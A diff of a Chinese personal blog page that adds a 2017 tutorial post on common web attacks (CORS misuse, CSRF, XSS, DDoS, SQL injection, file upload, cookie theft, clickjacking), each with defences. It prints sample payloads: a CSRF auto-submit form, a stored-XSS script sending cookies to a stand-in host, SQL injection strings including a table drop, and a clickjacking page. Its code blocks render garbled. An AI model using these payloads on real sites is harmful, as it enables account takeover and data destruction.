@@ -18,17 +18,24 @@ var _hmt = _hmt || [];
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2016/6 | 起今知行 | 思考者</title>
+  <title>web常见攻击方式 | 起今知行 | 思考者</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录生活点滴">
-<meta property="og:type" content="website">
-<meta property="og:title" content="起今知行 | 思考者">
-<meta property="og:url" content="http://yoursite.com/archives/2016/06/index.html">
+  <meta name="description" content="#web常见攻击方式
+##1.跨域资源共享(CORS)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web常见攻击方式">
+<meta property="og:url" content="http://yoursite.com/2017/02/28/web常见攻击方式/index.html">
 <meta property="og:site_name" content="起今知行 | 思考者">
-<meta property="og:description" content="记录生活点滴">
+<meta property="og:description" content="#web常见攻击方式
+##1.跨域资源共享(CORS)">
+<meta property="og:image" content="http://yoursite.com/images/ddos_1.png">
+<meta property="og:image" content="http://b.hiphotos.baidu.com/image/pic/item/3ac79f3df8dcd1001341dbcd768b4710b8122f78.jpg">
+<meta property="og:updated_time" content="2017-08-07T09:02:35.117Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="起今知行 | 思考者">
-<meta name="twitter:description" content="记录生活点滴">
+<meta name="twitter:title" content="web常见攻击方式">
+<meta name="twitter:description" content="#web常见攻击方式
+##1.跨域资源共享(CORS)">
+<meta name="twitter:image" content="http://yoursite.com/images/ddos_1.png">
   
   
     <link rel="icon" href="/favicon.png">
@@ -152,72 +159,256 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-web常见攻击方式" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/06/16/hexo搭建个人博客/" class="archive-article-date">
-  	<time datetime="2016-06-16T06:26:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-16</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/06/16/hexo搭建个人博客/">hexo搭建个人博客</a>
+    <h1 class="article-title" itemprop="name">
+      web常见攻击方式
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2017/02/28/web常见攻击方式/" class="archive-article-date">
+  	<time datetime="2017-02-28T03:21:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#web常见攻击方式</p>
+<p>##1.跨域资源共享(CORS)<br><a id="more"></a></p>
+<p>####1.介绍</p>
+<ul>
+<li>跨域资源共享（Cross-origin resource sharing）定义了浏览器和服务器交互的方式是否允许跨域。使ajax可以实现跨域访问。</li>
+<li>通过服务端设置请求与中的头信息中的属性Access-Control-Allow-Origin 来开启跨域的访问，可以固定跨域请求的来源如：<a href="https://ios.1dabang.cn" target="_blank" rel="external">https://ios.1dabang.cn</a> 。也可以使用 * 来允许所有的跨域访问。</li>
+<li>跨域请求分为俩种请求方式，简单请求/非简单请求<ul>
+<li>简单请求固定了请求的方法(get,post,head)和http的头信息(一些固定的头信息字段)，发送cors简单请求时，浏览器会增加<strong>Origin</strong>头信息字段，说明请求来自哪个源(协议、域名、端口)。</li>
+<li>非简单请求是带有特殊要求的请求，比如请求方法是PUT DELETE等，或者头信息需要封装非固定的信息，比如现在项目中的TokenKey。在执行非简单CORS的请求之前，会先进行一次“预检”(preflight)的请求，将请求的方法、头信息发送至服务端，服务端返回是否可以进行非简单CORS请求。<br>####2.风险/攻击</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>在服务端开启支持跨域访问后，通过http请求头信息来判断是否可以进行跨域请求。http头信息可以通过代码、浏览器开发者工具被伪造，所以无法确定请求是否真的来自于特定的域。</li>
+<li>第三方被入侵，如：服务端(A)允许来自<a href="http://xx.1dabang.cn" target="_blank" rel="external">http://xx.1dabang.cn</a> (B)的请求，B被入侵之后，可以通过B向A无限制的发送请求，从而获取/篡改数据。</li>
+<li>针对用户的跨站伪造请求(CSRF)；见(2)。<br>####3.防护<br>1.在允许跨域请求时，增加多种服务器验证方式，如：使用token来做二次的效验操作。<br>2.加强服务端对请求数据的效验。保证数据的有效性。<br>3.暴露最少最必须的功能，暴露最少的可用信息。</li>
+</ol>
+<p>##2.跨站伪造请求(CSRF)</p>
+<p>####1.介绍</p>
+<ul>
+<li>CSRF（Cross-site request forgery）跨站请求伪造是一种对网站用户的利用。是基于对用户的攻击。</li>
+<li>CSRF简单的来说，就是利用了用户的身份，以用户的名义来发送恶意的请求。<br>####2.风险/攻击</li>
+</ul>
+<ol>
+<li>举个例子：用户C登录<a href="http://1dabang.cn" target="_blank" rel="external">http://1dabang.cn</a> (A)，留下cookie/session，在接下来的一段时间内，用户A可以一直请求该网站。这时，用户又访问了网站<a href="http://xxx.com" target="_blank" rel="external">http://xxx.com</a> (B)，这时B页面中含有访问A页面的请求，见下方，这时浏览器带着C访问A留下来的cookie/session访问了A网站。就会被恶意的访问一些请求。这种情况需要建立在A网站开启了跨域访问。</li>
+<li><p>get类型的CSRF</p>
+<figure class="highlight plain"><figcaption><span>src="http://1dabang.cn/user/delete?userId=1"</span><a href="/>```">link</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">3. post类型的CSRF</div></pre></td></tr></table></figure>
+<p> <form action="http://1dabang.cn/user/delete" method="POST"><br> <input type="text" name="userId" value="1"><br> </form><br> <script> document.forms[0].submit(); </script></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">![](images/csrf_1.jpg)</div><div class="line">####3.防护</div><div class="line">1. 验证 HTTP Referer 字段，在HTTP的头信息里有一个字段，记录了该HTTP请求的来源地址，通过判断该来源地址来验证是否正常请求。</div><div class="line">2. 增加多种验证的方式。例：增加token；头信息增加验证字段。</div><div class="line">3. 将cookie设置为HttpOnly，设置该属性后，js脚本将无法获得cookie值。</div><div class="line">4. 增加多种验证码</div><div class="line"></div><div class="line">##3.跨站脚本攻击(XSS)</div><div class="line">####1.介绍</div><div class="line">- ​跨站脚本攻击(Cross Site Scripting)，是指恶意攻击者往web页面里插入恶意的script的代码，当用户浏览网页时，script代码执行，从而达到攻击用户的目的。</div><div class="line">- XSS漏洞分为俩种</div><div class="line">  - 一种是DOM Based XSS漏洞，基于网页DOM结构的攻击，受害人较少。</div><div class="line">  - 一种是Stored XSS漏洞，存储式的XSS漏洞，受害人较多。</div><div class="line">####2.风险/攻击</div><div class="line">1. 第一种DOM Based XSS漏洞，是以网页来攻击的。比如有一个网页地址</div><div class="line">   ```http://1dabang.cn/user?userName=123</div></pre></td></tr></table></figure>
+<p>假设用户A已登录该网站，我发送一个超链接给A，超链接地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">   这时就成功盗取了用户A的cookie，cookie极有可能存有登录账户及密码。</div><div class="line">2. 第二种stored css漏洞，则是将script脚本存储在数据库。在网站中所有用户可以输入的文本框的地方，都可以被注入，比如我发了一条说说，说说里插入该代码。</div><div class="line">   ```今天很开心！&lt;script&gt;window.open(&quot;www.x.com?param=&quot;+document.cookie)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>所有看到我的说说的人都会中招，他们的cookie都会发送到我的服务器上。危害性更大。<br>####3.防护</p>
+</li>
+<li>过滤所有来源的数据，将所有数据进行转义存储。比如&lt; &gt; “ ‘ 等特殊字符。</li>
+</ol>
+<p>##4.分布式拒绝服务攻击(DDOS)</p>
+<p>####1. 介绍</p>
+<ul>
+<li><p>DDOS攻击是dos攻击的一种，也可以说是升级，dos如果是单挑，ddos就是群殴，更有威胁力。</p>
+</li>
+<li><p>DDOS攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDOS攻击，从而成倍地提高拒绝服务攻击的威力。DDOS就是一种以大量的请求占用大量的资源，从而达到网络瘫痪的目的。<br><img src="images/ddos_1.png" alt=""><br>####2.风险/攻击</p>
+</li>
+</ul>
+<ol>
+<li>通过使网络过载来干扰甚至阻断正常的网络通讯。</li>
+<li>通过向服务器提交大量请求，使服务器超负荷。</li>
+<li>阻断某一用户访问服务器。</li>
+<li>阻断某服务与特定系统或个人的通讯。</li>
+<li>DDOS的攻击方式特别的多，比如：IP Spoofing、LAND attack、ICMP floods、Application level floods、SYN Flood、DNS Query Flood、HTTP Flood等，太多了不做介绍了。目的都是一样的，拖垮服务器。</li>
+<li>CC攻击是DDOS的一种，单独写一下是因为我们公司使用阿里云的服务器，阿里云有提供了CC的防护功能。CC主要是用来攻击动态页面的。与攻击传统宽带资源不一样，CC攻击是使用大量的用户进行访问页面，页面中涉及到数据库的查询，用户多了，查询的次数就多了，占用大量数据库资源，使得数据库变得特别慢。比如：开10万个线程，不停的打开一个查询医生的页面，静态资源占用的比较少，但是每次打开都会走查询医生的列表。慢慢的，数据库就会因为访问人数过多而使速度缓慢下来。<br>####3.防护</li>
+<li>DDOS的防护没有什么特别有效的方法，只能从一些方案来限制一下。</li>
+<li>上云服务。一般云服务公司都有专门的云盾。</li>
+<li>拼宽带。使用大量的宽带支撑防止ddos。</li>
+<li>流量清洗&amp;封IP。有效性并不高。</li>
+</ol>
+<p>##5.SQL注入</p>
+<p>####1.介绍</p>
+<ul>
+<li>通过把sql命令伪装成正常的HTTP参数，传递到服务器，欺骗服务器最终执行恶意的sql命令，达到入侵的目的。<br>####2.风险/攻击</li>
+</ul>
+<ol>
+<li><p>假设登录网站的登录表单有昵称和密码两个字段，输入昵称和密码后，服务端进行验证，如果昵称和密码匹配，则显示登录，后端的查询验证为：</p>
+<figure class="highlight sql"><figcaption><span>= "select * from user where name = '" + name + "'" + " and pwd = '"+pwd + "'"```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">如果用户输入昵称为liu，并输入正确的密码，当然能够登录成功，但是如果用户输入的密码为' or '1'='1，此时sql语句为：</div><div class="line">```<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'liu'</span> <span class="keyword">and</span> pwd = <span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
+<p>这样只要昵称正确，就可以成功登录了。 如果用户输入’;drop table user;–，这样sql语句变为：</p>
+<figure class="highlight plain"><figcaption><span>* from user where nick = '' and pwd = '';drop table user;--'```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">   这样表user就被删除了。 </div><div class="line"></div><div class="line">####3.防护</div><div class="line">1. 使用预编译的sql语句。例： ```select * from user where name = ? and pwd = ?</div></pre></td></tr></table></figure>
+</li>
+<li><p>使用ORM框架(mybatis，hibernate等)。</p>
+</li>
+</ol>
+<p>##6.文件上传攻击</p>
+<p>####1.介绍</p>
+<ul>
+<li>顾名思义，文件上传攻击就是网站含有文件上传的功能，利用该功能上传一些木马，exe，shell，js，jsp等恶意的脚本语言。</li>
+<li>大部分的网站和应用系统都有上传功能，如用户头像上传，图片上传，文档上传等。一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意文件。<br>####2.风险/攻击</li>
+</ul>
+<ol>
+<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行；</li>
+<li>上传文件是WebShell时，攻击者可通过这些网页后门执行命令并控制服务器；</li>
+<li>上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击；</li>
+<li>上传文件是恶意图片时，图片中可能包含了脚本，加载或者点击这些图片时脚本会悄无声息的执行；</li>
+<li>上传文件是伪装成正常后缀的恶意脚本时，攻击者可借助本地文件包含漏洞(Local File Include)执行该文件。如将bad.php文件改名为bad.doc上传到服务器，再通过PHP的include，include_once，require，require_once等函数包含执行。<br>####3.防护</li>
+<li>对上传文件的检查，在客户端和服务端进行双向的检测。比如：一些文件判断的大小写(exe–Exe)，文件的名称(1.jpg—1.jpg.exe)在程序中的截断保存中，留下.exe而忽略.jpg。以及允许用户修改上传文件的路径。使用第三方上传的插件也会引起该问题。不仅仅判断文件的后缀，还要从文件的头信息等来判断文件的格式。</li>
+<li>通过部署一些第三方公司的产品对网站的上传漏洞以及网站的文件进行检测(比如：oos)</li>
+<li>使用第三方插件，要及时的关注产品更新动态以作升级。</li>
+<li>将上传文件的目录设置为只读。去除执行的权限。</li>
+</ol>
+<p>##7.Cookie攻击</p>
+<p>####1.介绍</p>
+<ul>
+<li>cookie是一个非常广的范围。之前所说的跨站伪造请求和跨站脚本攻击多数都是为了获取用户的cookie。</li>
+<li>一个用户的cookie一旦被攻击者获取到，攻击者就可以冒充用户的身份做很多事情<br>####2.风险/攻击</li>
+</ul>
+<ol>
+<li><p>一些常见的js脚本，很容易就能获取到用户的cookie，比如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">   然后使用cookie冒充用户做操作。其实，用户的cookie和客户端的js脚本有很大的联系。这里不仅仅要防范用户的cookie被盗取，更多的是要防范js脚本的注入。</div><div class="line">####3.防护</div><div class="line">1. 将cookie设置为HttpOnly，设置该属性后，js脚本将无法获得cookie值。</div><div class="line">2. 加强客户端js脚本的防护，杜绝从服务端将恶意的js脚本传输至客户端。</div><div class="line"></div><div class="line">##8.点击劫持(ClickJacking)</div><div class="line">####1.介绍</div><div class="line">- 点击劫持是一种视觉上的欺骗手段，攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户在不知情的情况下点击了透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</div><div class="line">- 点击劫持与CSRF攻击有异曲同工之妙，都是在用户不知道情况下进行的攻击。与CSRF一样，点击劫持一样需要用户已经登录过该网站且拿到授权(session/cookie)。</div><div class="line">####2.风险/攻击</div><div class="line">1. 点击劫持可以将一些网站隐藏在自身网站之下， 比如，发送邮件，发送微博的页面做成iframe覆盖在自身网页上，当用户点击按钮时，就可以做到发送邮件/微博的效果。</div></pre></td></tr></table></figure></p>
+<p>&lt;!DOCTYPE html&gt;<br><html><br><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><br><head><br><title>点击劫持</title><br><style><br>iframe { width: 1440px; height: 900px; position: absolute; top: -0px; left: -0px; z-index: 2; -moz-opacity: 0; opacity: 0; filter: alpha(opacity=0); }<br>button { position: absolute; top: 250px; left: 770px; z-index: 1; width: 80px; height:20px; }<br></style><br></head><br><body><br><button>点击脱衣</button><br><img src="http://b.hiphotos.baidu.com/image/pic/item/3ac79f3df8dcd1001341dbcd768b4710b8122f78.jpg"><br><iframe src="http://www.medbigbang.com" scrolling="no"></iframe><br></body><br></html></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">比如上面这个网页，放置了一张美女图片和一个按钮，当吸引用户点击按钮时，就会跳转至http://www.medbigbang.com。 点击劫持需要调整按钮与隐藏iframe点击的位置，做到一致。</div><div class="line">####3.防护</div><div class="line">1. 设置http头的X-Frame-Options字段，设置为deny。不允许加载任何iframe页面。</div><div class="line">2. 在页面上增加js代码，禁止iframe的嵌套。</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>if(top.location !=location)  {<br>Top.location=self.location;<br>}<br>```</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Hexo</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Git</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Github</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Node.js</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">攻击</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/02/28/web常见攻击方式/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/08/07/吸血鬼数字的算法小记/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          吸血鬼数字算法
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2017/02/26/Hexo加入网易云音乐/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hexo加入网易云音乐</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="web常见攻击方式" data-title="web常见攻击方式" data-url="http://yoursite.com/2017/02/28/web常见攻击方式/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+var duoshuoQuery = {short_name:"liutao"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
   
 
-    
+
 
 
           </div>
@@ -240,8 +431,8 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
